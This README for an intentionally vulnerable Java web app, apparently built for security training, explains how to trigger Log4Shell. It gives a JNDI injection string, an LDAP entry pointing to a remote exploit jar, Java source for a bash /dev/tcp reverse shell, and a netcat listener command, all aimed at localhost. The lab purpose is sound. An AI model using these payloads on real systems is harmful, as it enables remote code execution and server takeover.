# vulnerable-webapp
An application with various vulnerabilities for testing

## Running the application

- Run the java file: ```java -jar vulnerable-webapp-[latest].jar```
- The default username is `jblogs` and the default password is `pa55word`.
- You will need a web browser such as firefox.


# Some vulnerabilities

## CVE-2021-44228 (log4shell)

To enable the in-memory LDAP server that is required for the JNDI lookup, you must run the application using the `ldap` spring profile e.g.:

```bash
java -Dspring.profiles.active=ldap -jar vulnerable-webapp-[latest].jar
```

Optionally, if you want to debug the in-memory LDAP server, you can enable `unboundid` debug logging using:


```bash
-Dcom.unboundid.ldap.sdk.debug.enabled=true -Dcom.unboundid.ldap.sdk.debug.level=INFO -Dcom.unboundid.ldap.sdk.debug.type=ASN1 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

### Triggering the vulnerability

To trigger the vulnerability and force Log4j to load a Java Naming Reference LDAP entry (rfc2713) using JNDI, inject the following code into the *username* field of the `user-admin` page (other fields may work too!)


```
${jndi:ldap://127.0.0.1:8081/uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk}
```

![JNDI log4shell injection](site/img/jndi-injection.jpg)


The in-memory server has the following `javaNamingReference` object which will be looked up by the JNDI service invoked by the log4j substitution code path:

```
dn: uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk
objectclass: top
objectclass: javaContainer
objectclass: javaObject
objectclass: javaNamingReference
javaCodeBase: http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar
javaClassName: uk.ac.jisc.cybersec.rce.RceExploit
javaFactory: uk.ac.jisc.cybersec.rce.RceExploit
cn: Java Class
sn: Class
uid: java-ref
```

The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` first from the local classpath (where it does not exist), then from the URL codebase provided by the LDAP entry. This triggers the download of the referenced `jar` file, and the instatiation of the `uk.ac.jisc.cybersec.rce.RceExploit` class. Triggering the static method in the malicious class:

```java
package uk.ac.jisc.cybersec.rce;

/**
 * Sample RCE exploit class. 
 */
public class RceReverseShellExploit {

	static {
		try {
			System.out.println("****************************** Attempting takeover (reverse shell)...");
			String[] cmd = {
			           "bash",
			           "-c",
			           "exec 5<>/dev/tcp/127.0.0.1/8083;cat <&5 | while read line; do $line 2>&5 >&5; done" };
			 
			   Runtime.getRuntime().exec(cmd);
			System.out.println("****************************** Takeover success!");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
```

To establish a remote network connection to the compromised web-server, you (as the *bad-actor*) must start a listener on port `8083`. For example, using `netcat`:


```bash
nc -l 8083
```

Currently, this is limited to listening on *localhost* or the IP *127.0.0.1* and port *8083* (see how the `RceReverseShellExploit` class is establishing a remote shell). 
